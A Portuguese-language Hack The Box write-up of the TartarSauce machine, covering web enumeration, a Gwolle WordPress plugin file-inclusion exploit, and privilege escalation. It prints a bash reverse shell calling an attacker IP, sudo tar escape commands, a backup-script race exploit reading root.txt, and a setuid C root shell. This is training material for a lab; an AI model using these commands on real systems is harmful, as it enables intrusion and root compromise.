---
title: "Hack The Box - TartarSauce"
tags: [Linux,Medium,Linpeas,PSPY,Gobuster,Wordpress,BurpSuite]
categories: HackTheBox OSCP
---

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-tartarsauce/T_inicial.png)

Link: <https://www.hackthebox.eu/home/machines/profile/138>

# Enumeração

## Primeiro passo é rodar o nmap contra a máquina, para verificar quais portas estão abertas e quais serviços estão sendo disponibilizados pelas portas.

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-tartarsauce/T_nmap.png)

### Explicação de cada parâmetro do Nmap

> -sC --> Rodar alguns scripts padrão em cada porta

> -sV --> Levantar qual serviço está rodando na porta

> -Pn --> Já considera o host ativo

### Verificamos que temos apenas uma porta aberta no servidor

> Porta 80 - Servidore Web

## Enumeração da porta 80

Abrimos o browser no endereço e encontramos a seguinte página web

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-tartarsauce/T_web.png)

Apenas uma imagem de uma garrafa... nada de estranho. Vimos também que o nmap nos trouxe o conteúdo do /robots.txt, então é o caso vermos que tem ali

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-tartarsauce/T_robots.png)

Hummm... bastante coisa interessante. Vimos esse monstra ai, vamos explorar ele depois pq não tem como obter shell por ele mesmo ele sendo vulnerável (é um rabbit hole)

### Gobuster na porta 80

Então rodamos o Gobuster na página pra ver se conseguimos algo nela

gobuster dir -u http://10.10.10.88 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 50

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-tartarsauce/T_gobuster.png)

Explicação parâmetros

> dir --> modo discover

> -w --> wordlist utilizada

> -t 50 --> aumentar as threads para ir mais rápido

Encontramos apenas esse /webservice que já haviamos encontrado no robots.txt, então entramos nele

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-tartarsauce/T_web1.png)

Recebemos um erro 403 Forbidden, mas mesmo assim não nos impede de realizar um Gobuster nele, uma vez que pelo robots.txt vimos que temos acesso a outras páginas

gobuster dir -u http://10.10.10.88/webservices -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 50

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-tartarsauce/T_gobuster1.png)

Encontramos esse /webservices/wp... só um problema é que sinalizou um erro 301 Redirect

### /webservices/wp

Então vamos verificar o que tem nesse /webservices/wp

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-tartarsauce/T_wp.png)

Realmente bem estranha a página, vamos verificar no código fonte dela pra ver se tem algo que podemos fazer pra melhorar o visual

Bom, encontramos o que está acontecendo, ele está sendo direcionado pra um endereço com apenas uma / isso que ta causando o problema na vizualização

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-tartarsauce/T_wp1.png)

Pra podermos corrigir isso vamos utilizar o BurpSuite e substituir todos os http:/ por http://, ai vai da certo

Abrimos o BurpSuite vamos em Proxy - Options - Match and Replace

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-tartarsauce/T_burp.png)

Adicionamos um filtro pra Response Body ser alterada

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-tartarsauce/T_burp1.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-tartarsauce/T_burp2.png)

Deixamos o Intercept Off

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-tartarsauce/T_burp3.png)

Atualizamos a página

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-tartarsauce/T_burp4.png)

Bom, agora temos acesso a uma página melhorada, não que isso vá influenciar na exploração, mas é bom ser mostrado como podemos corrigir esse problema que a página nos trouxe

### Wpscan

Sempre que vemos um WordPress, devemos rodar o Wpscan

wpscan http://10.10.10.88/webservices/wp/ --enumerate p,t,u

p -> plugins

t -> themes

u -> users

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-tartarsauce/T_wpp.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-tartarsauce/T_wpp1.png)

Puts, nada de interessante... mas está estranho, geralmente WordPress é exploração certa, e nos plugins ainda...

### Enumerando WordPress com wfuzz

Bom, já que o wpscan não encontrou nada, vamos tentar enumerar os plugins (que quase sempre são vulneráveis) pelo wfuzz

> wfuzz -c -t 500 --hc=404 -w /usr/share/SecLists/Discovery/Web-Content/CMS/wp-plugins.fuzz.txt http://10.10.10.88/webservices/wp/FUZZ

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-tartarsauce/T_wfuzz.png)

Encontramos 4 plugins instalados na aplicação, mas ai vc me pergunta, pq o wpscan não achou? Esse é um dos problemas de ferramentas altamente automatizadas, as vezes quem criou a máquina simplesmente trocou alguma informação ou algo assim que vem por padrão no WordPress, isso já é o suficiente para o wpscan não encontrar nada

# Exploração Plugin Gwolle

Bom, como encontramos plugins instalados, vamos procurar por maneiras de se explorar esses plugins, um deles é o Gwolle. Através de uma rápida pesquisa no searchsploit encontramos um exploit para ele

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-tartarsauce/T_searchsploit.png)

Certo, sabemos que tem um RCE pra versão 1.5.3, mas qual versão está rodando no servidor?

Procuramos saber como está estruturado esse plugin, quais são as pastas e arquivos que tem nele

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-tartarsauce/T_g.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-tartarsauce/T_g1.png)

Bom, acessando esse readme.txt encontramos isso... Isso também explica pq o wpscan não encontrou nada!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-tartarsauce/T_g3.png)

Agora vamos explorar ele, copiamos esse exploit para nossa máquina e vemos o que podemos fazer

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-tartarsauce/T_searchsploit1.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-tartarsauce/T_searchsploit2.png)

> https://www.immuniweb.com/advisory/HTB23275

Bom, ai tá o que devemos fazer está aqui:

`http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://ip/path`

## Pegando reverse shell

Bom, sabendo disso, vamos montar nosso reverse shell php na máquina e carregar no servidor, vou usar um que já vem por padrão na Kali

Aqui no caso, quando a requisição bate na nossa máquina, ela por padrão procura por um arquivo wp-load.php para fazer o download e executar ele, então devemos nomear nosso shell de wp-load.php

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-tartarsauce/T_rev.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-tartarsauce/T_rev1.png)

Agora depois de abrir um Python HTTP Server na Kali, abrimos a requisição no site

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-tartarsauce/T_rev2.png)

Recebemos a reverse shell

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-tartarsauce/T_rev3.png)

# Escalação de Privilégio -> Onuma

Bom, então vamos começar a escalação de privilégio, vamos rodar o linpeas na máquina

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-tartarsauce/T_lin.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-tartarsauce/T_lin1.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-tartarsauce/T_lin2.png)

Verificamos que podemos dar sudo como onuma no tar

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-tartarsauce/T_lin3.png)

Vamos explorar de dois modos isso

## 1º Modo de explorar TAR -> --to-command

O primeiro modo é tomar vantagem da possibilidade de enviarmos saidas de arquivos zipados para outros arquivos. Se pensarmos assim podemos "zipar" um comando de shell, e mandar ele para o /bin/bash... não? Vamos lá então

Primeiro fazemos um "shell" e colocamos ele em um arquivo tar

echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.16.117/443 0>&1' > shell.sh

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-tartarsauce/T_tar.png)

Agora zipamos ele com o tar

tar -cvf shell.tar shell.sh

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-tartarsauce/T_tar1.png)

Agora é só rodar o `tar` com a opção `--to-command`. Ele passar o arquivo que está zipado para algum binário, no caso /bin/bash, vai executar e me dar um shell

sudo -u onuma tar -xvf shell.tar --to-command /bin/bash

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-tartarsauce/T_tar2.png)

## 2º Modo de explorar TAR --> --checkpoint-action

Esse é mais simples, pq o comando é em uma linha só, o que de certo modo facilita a exploração. Vamo lá!

A flag `checkpoint=y` diz pro TAR executar algo a cada y bytes, conforme for indo o progresso do zip. Por padrão é uma mensagem na tela, mas posso alterar isso pra o que eu quiser... hummmmmmmm, posso mandar /bin/bash? Sim!

O comando fica assim

sudo -u onuma tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-tartarsauce/T_tar4.png)

Isso está no `gtfobins`, é o caso ter esse tipo de site sempre na manga

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-tartarsauce/T_gt.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-tartarsauce/T_gt1.png)

# Escalação de Privilégio --> Root

Agora com um usuário comum na máquina, vamos iniciar a escalação pra root

Bom, rodamos o linpeas e não tivemos muito sucesso... (o ponto de escalação estava lá, mas não era tão simples de se perceber assim)

Então próximo passo é rodar o pspy

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-tartarsauce/T_pspy.png)

> https://github.com/DominicBreuker/pspy

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-tartarsauce/T_pspy1.png)

Passamos pra máquina

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-tartarsauce/T_pspy2.png)

Executamos na máquina e verificamos que a cada 5 min mais ou menos ele executa um script chamado `backuperer` que não é padrão do sistema

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-tartarsauce/T_pspy3.png)

## Explorando backuperer

Aqui está o script

$cat /usr/sbin/backuperer

```
#!/bin/bash                                                                    

#-------------------------------------------------------------------------------------                                                                                                                                                                                                                                       
# backuperer ver 1.0.2 - by ȜӎŗgͷͼȜ                                            
# ONUMA Dev auto backup program                                                
# This tool will keep our webapp backed up incase another skiddie defaces us again.                                                                           
# We will be able to quickly restore from a backup in seconds ;P                                                                                              
#-------------------------------------------------------------------------------------                                                                                                                                                                                                                                       

# Set Vars Here                                                                
basedir=/var/www/html                                                          
bkpdir=/var/backups                                                            
tmpdir=/var/tmp                                                                
testmsg=$bkpdir/onuma_backup_test.txt                                          
errormsg=$bkpdir/onuma_backup_error.txt                                        
tmpfile=$tmpdir/.$(/usr/bin/head -c100 /dev/urandom |sha1sum|cut -d' ' -f1)                                                                                   
check=$tmpdir/check                                                            

# formatting                                                                   
printbdr()                                                                     
{                                                                              
    for n in $(seq 72);                                                        
    do /usr/bin/printf $"-";                                                   
    done                                                                       
}                                                                              
bdr=$(printbdr)                                                                

# Added a test file to let us see when the last backup was run                                                                                                
/usr/bin/printf $"$bdr\nAuto backup backuperer backup last ran at : $(/bin/date)\n$bdr\n" > $testmsg                                                                                                                                                                                                                         

# Cleanup from last time.                                                      
/bin/rm -rf $tmpdir/.* $check                                                  

# Backup onuma website dev files.                                              
/usr/bin/sudo -u onuma /bin/tar -zcvf $tmpfile $basedir &                                                                                                     

# Added delay to wait for backup to complete if large files get added.                                                                                        
/bin/sleep 30                                                                  

# Test the backup integrity                                                    
integrity_chk()                                                                
{                                                                              
    /usr/bin/diff -r $basedir $check$basedir                                                                                                                  
}                                                                              

/bin/mkdir $check                                                              
/bin/tar -zxvf $tmpfile -C $check                                              
if [[ $(integrity_chk) ]]                                                      
then                                                                           
    # Report errors so the dev can investigate the issue.                                                                                                     
    /usr/bin/printf $"$bdr\nIntegrity Check Error in backup last ran :  $(/bin/date)\n$bdr\n$tmpfile\n" >> $errormsg                                                                                                                                                                                                         
    integrity_chk >> $errormsg                                                 
    exit 2                                                                     
else                                                                           
    # Clean up and save archive to the bkpdir.                                                                                                                
    /bin/mv $tmpfile $bkpdir/onuma-www-dev.bak                                                                                                                
    /bin/rm -rf $check .*                                                      
    exit 0                                                                     
fi                                                                             
```

Antes de qualquer coisa vamos tentar entender o que ele faz, pra podermos achar uma maneira de explorar ele

Primeira coisa que ele faz é setar as variáveis

```
# Set Vars Here                                                                
basedir=/var/www/html                                                          
bkpdir=/var/backups                                                            
tmpdir=/var/tmp                                                                
testmsg=$bkpdir/onuma_backup_test.txt                                          
errormsg=$bkpdir/onuma_backup_error.txt                                        
tmpfile=$tmpdir/.$(/usr/bin/head -c100 /dev/urandom |sha1sum|cut -d' ' -f1)                                                                                   
check=$tmpdir/check    
```

Segunda coisa é usar o tar como usuário onuma para zipar tudo que está em $basedir e salva no $tmpfile, ele salva o início do arquivo com um .NUMEROS então eu vou saber qual arquivo que foi zipado

```
# Backup onuma website dev files.
/usr/bin/sudo -u onuma /bin/tar -zcvf $tmpfile $basedir &
```

Terceiro vai fazer um diretório em /var/tmp/check (após 30 segundos de sleep)

```
/bin/mkdir $check
```

Quarto, vai extrair $tmpfile para esse diretório que foi criado

```
/bin/tar -zxvf $tmpfile -C $check
```

Vai rodar a função intregity_check (é um diff entre o /var/www/html e o arquivo que foi feito o backup), se sair tudo certo vai mover o arquivo tmp para /var/backups/onuma-www-dev.bak se der erro vai logar o erro em /vat/backups/onuma_backup_error.txt

```
if [[ $(integrity_chk) ]]
then
    # Report errors so the dev can investigate the issue.
    /usr/bin/printf $"$bdr\nIntegrity Check Error in backup last ran :  $(/bin/date)\n$bdr\n$tmpfile\n" >> $errormsg
    integrity_chk >> $errormsg
    exit 2
else
    # Clean up and save archive to the bkpdir.
    /bin/mv $tmpfile $bkpdir/onuma-www-dev.bak
    /bin/rm -rf $check .*
    exit 0
fi
```

Bom, vamos explorar de dois modos esse backuper, o primeiro é fazer um LFI para ler o root.txt e outro pra ganhar um shell de root (que deve sempre ser o objetivo final, ler a flag não quer dizer nada)

### Explorando um LFI nele

A ideia desse exploit (peguei a dica do 0xdf, créditos totais pra ele) é explorar esse sleep que ele tem de 30 segundos e o diff que ele faz... pensando assim, se eu nesse intervalo que ele faz o diff, trocar o arquivo que vai ser feito a verificação por um link para o root.txt, qnd ele der o diff, vai printar a flag... Vamos lá

O script tbm peguei do 0xdf, só passei pra português e acrescentei mais explicações

```
#!/bin/bash

# vamos para um diretório temporário
cd /dev/shm

# setar as duas variáveis com o nome do arquivo que foi feito o bakcup
start=$(find /var/tmp -maxdepth 1 -type f -name ".*")
cur=$(find /var/tmp -maxdepth 1 -type f -name ".*")

# vai ficar dando loop até ser feito outro backup
echo "Waiting for archive filename to change..."
while [ "$start" == "$cur" -o "$cur" == "" ] ; do
    sleep 10;
    cur=$(find /var/tmp -maxdepth 1 -type f -name ".*");
done

# vai copiar o arquivo mudado
echo "Já que foi alterado, vamos copiar"
cp $cur .

# vai pegar o nome do arquivo
fn=$(echo $cur | cut -d'/' -f4)

# extrair ele
tar -zxf $fn

# remover robots.txt e trocar por um link para root.txt
rm var/www/html/robots.txt
ln -s /root/root.txt var/www/html/robots.txt

# apagar o arquivo velho
rm $fn

# criar um arquivo novo
tar czf $fn var

# colocar ele de novo como se fosse o backup e apagar
mv $fn $cur
rm $fn
rm -rf var

# agora é esperar
echo "Esperando pela flag..."
tail -f /var/backups/onuma_backup_error.txt
```

Executando na máquina... temos a flag

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-tartarsauce/T_flag.png)

Bacana, consigo ler a flag de root. Mas o que eu quero mesmo é um shell de root

### Pegando shell de root

A exploração se baseia no fato do TAR quando extrai algum arquivo, ele mantém as permissões do arquivo do usuário que a executou, então se criarmos um arquivo com setuid, quando ele extrair vai manter essa setuid habilitada, mas vai passar pra root pq quem extraiu foi o root... fez sentido? Bom acho que explicando vai fazer mais

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-tartarsauce/T_s.png)

Criamos um arquivo com setuid habilitado

```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main ( int argc, char *argv[] )
{
        setreuid(0,0);
        execve("/bin/bash",NULL,NULL);
}
```

Compilamos ele

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-tartarsauce/T_s2.png)

Habilitamos o setuid do arquivo

`chmod 6555 shell`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-tartarsauce/T_s3.png)

Criamos a pasta /var/www/html e passamos esse shell para dentro dela

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-tartarsauce/T_s5.png)

Bom, o que aconteceu... o arquivo tem como dono root, tem setuid habilitado e pode ser executado por todos, quando o tar dezipar na máquina esse arquivo, ele vai manter essas permissões

Zipamos as pastas

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-tartarsauce/T_s6.png)

Passamos para a pasta /var/tmp da máquina

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-tartarsauce/T_s7.png)

Agora é esperar pra ver a mágica acontecer, esperar ele criar aquela pasta *.MONTE DE COISA ALEATÓRIO*, quando ele criar nós trocamos o nome dela pelo o arquivo setuid.tar.gz, pq é esse arquivo setuid.tar.gz que queremos que seja extraido no diretório check

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-tartarsauce/T_s8.png)

No momento que acabar o sleep de 30 segundos, ele vai dezipar o arquivo tmp no diretório check que foi criado

Pensando assim, quando ele dezipar, o diff deu certo, por que as pastas são as mesmas que tem no arquivo original (aquele que foi zipado com nome .MONTE DE NUMERO) ele vai manter as permissões de root, o setuid habilitado e qualquer usuário podendo executar... ou seja, temos root

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-tartarsauce/T_s9.png)

## Pegamos as flags de user e root

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-tartarsauce/T_root.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-tartarsauce/T_user.png)

# Explorando Monstra CMS

Agora vamos voltar para o Monstra CMS e explicar pq não conseguimos um shell nele (é um rabbit hole)

Se lembrarmos o /robots.txt da máquina vemos vários links para esse CMS

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-tartarsauce/T_r.png)

Acessamos o monstra

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-tartarsauce/T_r1.png)

Verificamos um campo de login

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-tartarsauce/T_r2.png)

Tentamos credenciais padrão e conseguimos acesso `admin:admin`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-tartarsauce/T_r3.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-tartarsauce/T_rl.png)

Então, pesquisamos por exploits, achamos vários, mas nenhum funciona

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-tartarsauce/T_r4.png)

Deveria funcionar, uma vez que temos login válido, a versão bateu... mas pq será que não funciona? Com um shell na máquina descobirmos o por que, os diretórios /webservices tem como dono o root

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-tartarsauce/T_r7.png)

O exploite tentar escrever na pasta `/var/www/html/webservices/monstra-3.0.4/public/uploads` (que também tem como dono o root)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-tartarsauce/T_r6.png)

Ou seja, meu usuário é o www-data, que é o do apache, ele não pode escrever em pastas que tenha como dono o root... muito sacana o cara que fez essa máquina, realmente leva a pessoa a pensar, não sair só executando os scripts!

Máquina muito bem bolada!